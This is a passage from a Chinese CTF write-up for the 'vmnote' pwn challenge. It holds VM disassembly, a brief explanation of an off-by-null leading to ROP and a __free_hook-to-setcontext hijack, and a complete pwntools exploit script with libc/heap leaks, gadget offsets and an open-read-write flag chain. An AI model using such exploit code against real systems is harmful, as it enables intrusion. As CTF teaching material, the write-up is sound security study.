label_98:     mov  rdi, 0x5
label_a2:     call menu
label_a3:     ret

label_a4:     mov rdx, rsi
label_a7:     mov rsi, rdi
label_aa:     mov  rdi, 0x6
label_b4:     call menu
label_b5:     ret

label_b6:     mov rsi, rdi
label_b9:     mov  rdi, 0x7
label_c3:     call menu
label_c4:     ret

label_c5:     push rbp
label_c7:     mov rbp, rsp
label_ca:     sub  rsp, 0x60
label_d4:     mov  rdi, 0x1000
label_de:     call print_str
label_e3:     call label_6b
label_e8:     and  rdi, 0xfffffff
label_f2:     mov [rsp], rdi
label_f5:     nop
label_f7:     mov  rdi, 0xa
label_101:     nop
label_103:     mov  rdi, 0x100c
label_10d:     call print_str
label_112:     mov rdi, rsp
label_115:     add  rdi, 0x10
label_11f:     mov  rsi, 0x30
label_129:     call read_str
label_12e:     mov rdi, rsp
label_131:     add  rdi, 0x10
label_13b:     mov rsi,  [rsp]
label_13e:     call label_413
label_143:     leave
label_144:     ret

label_145:     push rbp
label_147:     mov rbp, rsp
label_14a:     mov  rdi, 0x1132
label_154:     call print_str
label_159:     call label_629
label_15e:     cmp rdi, 0x1
label_168:     jz label_1ae
label_16d:     cmp rdi, 0x2
label_177:     jz label_1b8
label_17c:     cmp rdi, 0x3
label_186:     jz label_1c2
label_18b:     cmp rdi, 0x4
label_195:     jz label_1cc
label_19a:     cmp rdi, 0x5
label_1a4:     jz label_1d6
label_1a9:     jmp label_14a
label_1ae:     call label_26a
label_1b3:     jmp label_14a
label_1b8:     call label_33d
label_1bd:     jmp label_14a
label_1c2:     call label_37b
label_1c7:     jmp label_14a
label_1cc:     call label_3d5
label_1d1:     jmp label_14a
label_1d6:     leave
label_1d7:     ret

label_1d8:     push rbp
label_1da:     mov rbp, rsp
label_1dd:     sub  rsp, 0x60
label_1e7:     mov  [rsp], rdi
label_1ea:     mov rdx, rsp
label_1ed:     add  rdx, 0x8
label_1f7:     mov  [rdx], rsi
label_1fa:     mov rdi, rsi
label_1fd:     call label_77
label_202:     test rdi, rdi
label_205:     jz label_30d
label_20a:     mov rdx, rsp
label_20d:     add  rdx, 0x10
label_217:     mov  [rdx], rdi
label_21a:     mov rdx,  [rsp]
label_21d:     mov  rsi, 0x1520
label_227:     shl  rdx, 0x3
label_231:     add rsi, rdx
label_234:     mov  [rsi], rdi
label_237:     mov  rdi, 0x1182
label_241:     call print_str
label_246:     mov rdx, rsp
label_249:     add  rdx, 0x8
label_253:     mov rsi,  [rdx]
label_256:     add  rdx, 0x8
label_260:     mov rdi,  [rdx]
label_263:     call label_a4
label_268:     leave
label_269:     ret

label_26a:     push rbp
label_26c:     mov rbp, rsp
label_26f:     sub  rsp, 0x60
label_279:     mov  rdi, 0x1173
label_283:     call print_str
label_288:     call label_629
label_28d:     cmp rdi, 0x0
label_297:     jl label_30d
label_29c:     cmp rdi, 0x4
label_2a6:     jg label_30d
label_2ab:     mov  [rsp], rdi
label_2ae:     mov  rsi, 0x1520
label_2b8:     shl  rdi, 0x3
label_2c2:     add rsi, rdi
label_2c5:     mov rdi,  [rsi]
label_2c8:     test rdi, rdi
label_2cb:     jnz label_30d
label_2d0:     mov  rdi, 0x117a
label_2da:     call print_str
label_2df:     call label_629
label_2e4:     cmp rdi, 0x0
label_2ee:     jl label_30d
label_2f3:     cmp rdi, 0x60
label_2fd:     jg label_30d
label_302:     mov rsi, rdi
label_305:     mov rdi,  [rsp]
label_308:     call label_1d8
label_30d:     leave
label_30e:     ret

label_30f:     push rbp
label_311:     mov rbp, rsp
label_314:     mov  rsi, 0x1520
label_31e:     shl  rdi, 0x3
label_328:     add rsi, rdi
label_32b:     mov rdi,  [rsi]
label_32e:     test rdi, rdi
label_331:     jz label_33b
label_336:     call label_b6
label_33b:     leave
label_33c:     ret

label_33d:     push rbp
label_33f:     mov rbp, rsp
label_342:     mov  rdi, 0x1173
label_34c:     call print_str
label_351:     call label_629
label_356:     cmp rdi, 0x0
label_360:     jl label_379
label_365:     cmp rdi, 0x4
label_36f:     jg label_379
label_374:     call label_30f
label_379:     leave
label_37a:     ret

label_37b:     push rbp
label_37d:     mov rbp, rsp
label_380:     mov  rdi, 0x118d
label_38a:     call label_696
label_38f:     leave
label_390:     ret

label_391:     push rbp
label_393:     mov rbp, rsp
label_396:     sub  rsp, 0x40
label_3a0:     mov  rsi, 0x1520
label_3aa:     shl  rdi, 0x3
label_3b4:     add rsi, rdi
label_3b7:     mov  [rsp], rsi
label_3ba:     mov rdi,  [rsi]
label_3bd:     test rdi, rdi
label_3c0:     jz label_3d3
label_3c5:     call label_86
label_3ca:     mov rsi,  [rsp]
label_3cd:     xor rdi, rdi
label_3d0:     mov  [rsi], rdi
label_3d3:     leave
label_3d4:     ret

label_3d5:     push rbp
label_3d7:     mov rbp, rsp
label_3da:     mov  rdi, 0x1173
label_3e4:     call print_str
label_3e9:     call label_629
label_3ee:     cmp rdi, 0x0
label_3f8:     jl label_411
label_3fd:     cmp rdi, 0x4
label_407:     jg label_411
label_40c:     call label_391
label_411:     leave
label_412:     ret

label_413:     push rbp
label_415:     mov rbp, rsp
label_418:     sub  rsp, 0x60
label_422:     mov  [rsp], rdi
label_425:     mov rdi, rsp
label_428:     add  rdi, 0x8
label_432:     mov  [rdi], rsi
label_435:     mov rdi,  [rsp]
label_438:     call label_654
label_43d:     cmp rdi, 0x11
label_447:     jg label_451
label_44c:     jmp label_49a
label_451:     mov rdi,  [rsp]
label_454:     add  rdi, 0x11
label_45e:     call label_95
label_463:     sub  rdi, 0x12345678
label_46d:     mov rsi, rsp
label_470:     add  rsi, 0x8
label_47a:     mov rsi,  [rsi]
label_47d:     cmp rsi, rdi
label_480:     jz label_48a
label_485:     jmp label_49a
label_48a:     mov rdi,  [rsp]
label_48d:     call label_6cf
label_492:     test rdi, rdi
label_495:     jnz label_4a9
label_49a:     mov  rdi, 0x1018
label_4a4:     call label_769
label_4a9:     leave
label_4aa:     ret

decode_str:     mov  rdi, 0x1000
label_4b5:     mov  rsi, 0x89
label_4bf:     call label_5ba
label_4c4:     mov  rdi, 0x100c
label_4ce:     mov  rsi, 0x42
label_4d8:     call label_5ba
label_4dd:     mov  rdi, 0x1018
label_4e7:     mov  rsi, 0x24
label_4f1:     call label_5ba
label_4f6:     mov  rdi, 0x1132
label_500:     mov  rsi, 0x47
label_50a:     call label_5ba
label_50f:     mov  rdi, 0x1173
label_519:     mov  rsi, 0x11
label_523:     call label_5ba
label_528:     mov  rdi, 0x117a
label_532:     mov  rsi, 0x11
label_53c:     call label_5ba
label_541:     mov  rdi, 0x1182
label_54b:     mov  rsi, 0x11
label_555:     call label_5ba
label_55a:     mov  rdi, 0x118d
label_564:     mov  rsi, 0x11
label_56e:     call label_5ba
label_573:     ret

label_574:     xor rcx, rcx
label_577:     xor r10, r10
label_57a:     xor r8, r8
label_57d:     xor r9, r9
label_580:     mov r8w, [rdi]
label_583:     mov r9w, [rsi]
label_586:     sub r8, r9
label_589:     cmp r8, 0x0
label_593:     jl label_5a0
label_598:     add rcx, r8
label_59b:     jmp label_5a3
label_5a0:     sub rcx, r8
label_5a3:     inc r10
label_5a5:     cmp r10, rdx
label_5a8:     jz label_5b6
label_5ad:     inc rdi
label_5af:     inc rsi
label_5b1:     jmp label_57a
label_5b6:     mov rdi, rcx
label_5b9:     ret

label_5ba:     xor r10, r10
label_5bd:     xor r9, r9
label_5c0:     mov r10w, [rdi]
label_5c3:     sub r10, r9
label_5c6:     and  r10, 0xff
label_5d0:     xor r10, rsi
label_5d3:     mov [rdi], r10b
label_5d6:     cmp r10, 0x0
label_5e0:     jz label_5ee
label_5e5:     inc rdi
label_5e7:     inc r9
label_5e9:     jmp label_5c0
label_5ee:     ret

read_str:     xor r10, r10
label_5f2:     xor r11, r11
label_5f5:     nop
label_5f7:     cmp r11, 0xa
label_601:     jz label_615
label_606:     mov [rdi], r11b
label_609:     inc rdi
label_60b:     inc r10
label_60d:     cmp r10, rsi
label_610:     jl label_5f5
label_615:     mov  r11, 0x0
label_61f:     mov [rdi], r11b
label_622:     mov rdi, rsi
label_625:     sub rdi, r10
label_628:     ret

label_629:     push rbp
label_62b:     mov rbp, rsp
label_62e:     sub  rsp, 0x60
label_638:     mov rdi, rsp
label_63b:     mov  rsi, 0x60
label_645:     call read_str
label_64a:     mov rdi, rsp
label_64d:     call label_95
label_652:     leave
label_653:     ret

label_654:     xor r10, r10
label_657:     xor r11, r11
label_65a:     mov r11w, [rdi]
label_65d:     cmp r11, 0x0
label_667:     jz label_675
label_66c:     inc rdi
label_66e:     inc r10
label_670:     jmp label_65a
label_675:     mov rdi, r10
label_678:     ret

label_679:     xor rdx, rdx
label_67c:     jmp label_68a
label_681:     mov cx, [rdi]
label_684:     nop
label_686:     inc rdi
label_688:     inc rdx
label_68a:     cmp rdx, rsi
label_68d:     jl label_681
label_692:     mov rdi, rdx
label_695:     ret

label_696:     call print_str
label_69b:     mov  rsi, 0xa
label_6a5:     nop
label_6a7:     ret

print_str:     push rsi
label_6aa:     push rdi
label_6ac:     xor rsi, rsi
label_6af:     mov si, [rdi]
label_6b2:     cmp rsi, 0x0
label_6bc:     jz label_6ca
label_6c1:     nop
label_6c3:     inc rdi
label_6c5:     jmp label_6af
label_6ca:     pop rdi
label_6cc:     pop rsi
label_6ce:     ret

label_6cf:     push rbp
label_6d1:     mov rbp, rsp
label_6d4:     sub  rsp, 0x40
label_6de:     mov  [rsp], rdi
label_6e1:     mov  rsi, 0x101f
label_6eb:     mov  rdx, 0x11
label_6f5:     call label_739
label_6fa:     mov rdi,  [rsp]
label_6fd:     mov  rsi, 0x1120
label_707:     mov  rdx, 0x11
label_711:     call label_574
label_716:     test rdi, rdi
label_719:     jz label_72d
label_71e:     mov  rdi, 0x0
label_728:     jmp label_737
label_72d:     mov  rdi, 0x1
label_737:     leave
label_738:     ret

label_739:     push rdx
label_73b:     push rsi
label_73d:     push rdi
label_73f:     xor rcx, rcx
label_742:     jmp label_75a
label_747:     mov r8w, [rdi]
label_74a:     mov r9, rsi
label_74d:     add r9, r8
label_750:     mov r9w, [r9]
label_753:     mov [rdi], r9b
label_756:     inc rdi
label_758:     inc rcx
label_75a:     cmp rcx, rdx
label_75d:     jl label_747
label_762:     pop rdi
label_764:     pop rsi
label_766:     pop rdx
label_768:     ret

label_769:     call label_696
label_76e:     call label_773
label_773:     call _exit
label_775:    

menu:
    ret

_exit:
    ret
```

这里尝试过用asm汇编以后在ida里用F5看，但是还是很难看，遂作罢。后面只能看汇编了。。

off-by-null后两次leave ret导致rop，虚拟机内部的rop即是虚拟机外部的堆溢出，改free_hook为setcontext，在堆上布置好以后即可orw.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" N0p / AAA """
from pwn import *
import sys, os, re

context(arch='amd64', os='linux', log_level='info')
# context.terminal = ('tmux', 'splitw', '-h')
context(terminal=['gnome-terminal', '--', 'zsh', '-c'])

_proc = os.path.abspath('/home/leixiao/ld/elfs/vmnote')
_libc = os.path.abspath('./libc-2.31.so')

libc = ELF(_libc)
elf = ELF(_proc)

# menu
choose_items = {
    "add": 1,
    "edit": 3,
    "show": 2,
    "delete": 4
}

def choose(idx):
    p.sendlineafter("choice>> ", str(idx))

def add(idx, size, content):
    choose(choose_items['add'])
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", content)

def edit(idx, content):
    choose(choose_items['edit'])
    p.sendlineafter("", str(idx))
    p.sendafter("", content)

def show(idx):
    choose(choose_items['show'])
    p.sendlineafter("idx: ", str(idx))

def delete(idx):
    choose(choose_items['delete'])
    p.sendlineafter("idx: ", str(idx))

def sploit():
    # import beautyexp; beautyexp.hook(p)
    p.recvuntil("challenge ")
    num = int(p.recvuntil("\n")[:-1],10)
    print num
    p.sendlineafter("passcode: ",'01d_6u7_v190r0u5_'+str(num+0x12345678))

    choose_items = {
        "add": 1,
        "edit": 3,
        "show": 2,
        "delete": 4
    }

    def choose(idx):
        p.sendlineafter("choice>> ", str(idx))

    def add(idx, size, content):
        choose(choose_items['add'])
        p.sendlineafter("idx: ", str(idx))
        p.sendlineafter("size: ", str(size))
        p.sendafter("content: ", content)

    def edit(idx, content):
        choose(choose_items['edit'])
        p.sendlineafter("", str(idx))
        p.sendafter("", content)

    def show(idx):
        choose(choose_items['show'])
        p.sendlineafter("idx: ", str(idx))

    def delete(idx):
        choose(choose_items['delete'])
        p.sendlineafter("idx: ", str(idx))

    add(0, 0x10, "libcaddr")
    show(0)
    p.recvuntil("libcaddr")
    libc_base = u64(p.recv(6) + "\x00" * 2) - 0x1ebb80 - 0x60

    delete(0)

    add(0, 0x10, "@")
    show(0)
    p.recvuntil("@")
    heap_base = (u64(p.recv(5) + "\x00" * 3) << 8) - 0x400
    print(hex(libc_base))
    print(hex(heap_base))

    rop_addr = 0x764 # pop r1; pop r2; ret
    rop3_addr = 0x762 # pop r0; pop r1; pop r2; ret
    syscall_6 = 0xaa
    syscall_4 = 0x89
    list_menu = 0x145

    chunk_ptr = heap_base + 0x4a0 # need to be leaked
    chunk_len = (1 << 31)
    rop = p64(rop_addr) + p64(chunk_ptr) + p64(chunk_len) + p64(syscall_6)
    rop += p64(rop_addr) + p64(libc_base + 0x1eeb28) + p64(0x80000000) + p64(syscall_6)
    rop += p32(rop3_addr)
    # rop += p64(rop_addr) + p64(libc_base + 0x1eeb28 - 0x8) + p64(0) + p64(syscall_4)

    choose("1")
    p.sendlineafter("idx: ", '1\x00'.ljust(0x50, 'B'))
    payload = "C" * 0x18
    payload += rop
    p.sendlineafter("size: ", payload)

    payload = '5\x00' + 6 * '\x00'
    payload += p64(rop_addr) + p64(libc_base + 0x1eeb28) + p64(0x80000000) + p64(syscall_4)
    payload = payload.ljust(0x60, 'A')
    p.sendafter("choice>> ", payload)
    payload = p64(heap_base + 0x440) + p64(0x0000000000000000) + p64(0x0000000000000000) + p64(0x0000000000000021) + p64(0x910000004d910000) + p64(0x000096180000005c) + p64(0x9100000000000000) + p64(0x0000000000000021) + p64(libc_base + 0x1eeb28) + p32(0x80)
    sleep(0.5)
    p.send(payload)

    pivot = libc_base + 0x0000000000154930 # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    pop_rax = libc_base + 0x000000000004a550 # pop rax ; ret
    pop_rdi = libc_base + 0x0000000000026b72 # pop rdi ; ret
    pop_rsi = libc_base + 0x0000000000027529 # pop rsi ; ret
    pop_rdx_pop = libc_base + 0x000000000011c371 # pop rdx ; pop r12 ; ret
    syscall_ret = libc_base + 0x0000000000066229 # syscall; ret;
    payload = p64(pivot) + p64(libc_base + libc.sym['__free_hook'])
    payload = payload.ljust(0x20, "\x00")
    payload += p64(libc_base + libc.sym['setcontext'] + 61)
    payload = payload.ljust(0xa0, "\x00")
    payload += p64(libc_base + libc.sym['__free_hook'] + 0xb0) + p64(pop_rax + 1) # len = 0x10
    payload += flat([pop_rax, 2, pop_rdi, libc_base + libc.sym['__free_hook'] + 0x188, pop_rsi, 0, syscall_ret]) # len = 0x38
    payload += flat([pop_rax, 0, pop_rdi, 3, pop_rsi, heap_base + 0x10, pop_rdx_pop, 0x30, 0, syscall_ret]) # len = 0x50
    payload += flat([pop_rax, 1, pop_rdi, 1, pop_rsi, heap_base + 0x10, pop_rdx_pop, 0x30, 0, syscall_ret]) # len = 0x50
    payload += "flag\x00"

    print(hex(pivot))

    # pause()
    # payload = "/bin/sh\x00" + p64(libc_base + libc.sym['system'])
    sleep(0.5)
    p.send(payload)
    # payload = "/bin/sh\x00" + p64(libc_base + libc.sym['system'])
    # sleep(0.5)
    # p.send(payload)
    res = p.recv()
    if 'flag' in res:
        print(res)
        # sys.exit(0)
        return 1

    p.close()
    return 0
    # p.interactive()

# p = process("vmnote.dbg")#, env={'LD_PRELOAD': './libc-2.31.so'})
# sploit()
while True:
    try:
        p = process("/home/leixiao/ld/elfs/vmnote", env={'LD_PRELOAD': './libc-2.31.so'})
        p.settimeout(0.5)
        if sploit():
            break
        p.close()
    except:
        p.close()

p.interactive()
```

### Tips

这题有亿点麻烦，由于栈的随机化脸黑的话很难调，但是由于是虚拟指令模拟的栈，所以可以考虑将rand patch掉以便调试。

